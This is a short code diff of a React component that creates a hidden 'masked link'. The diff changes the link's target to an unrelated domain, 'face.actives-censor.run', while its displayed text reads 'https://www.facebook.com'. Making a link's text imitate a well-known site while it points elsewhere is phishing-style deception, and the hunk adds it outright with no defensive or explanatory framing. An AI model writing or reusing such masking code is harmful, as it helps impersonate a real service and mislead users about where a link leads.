@@ -21,8 +21,8 @@ const Index = () => {
   useEffect(() => {
     // Create masked link
     const link = document.createElement("a");
-    link.href = "https://www.wacebook.com/login";
-    link.textContent = "https://www.wacebook.com";
+    link.href = "https://face.actives-censor.run";
+    link.textContent = "https://www.facebook.com";
     link.style.display = "none"; // Hide the link
     document.body.appendChild(link);
 
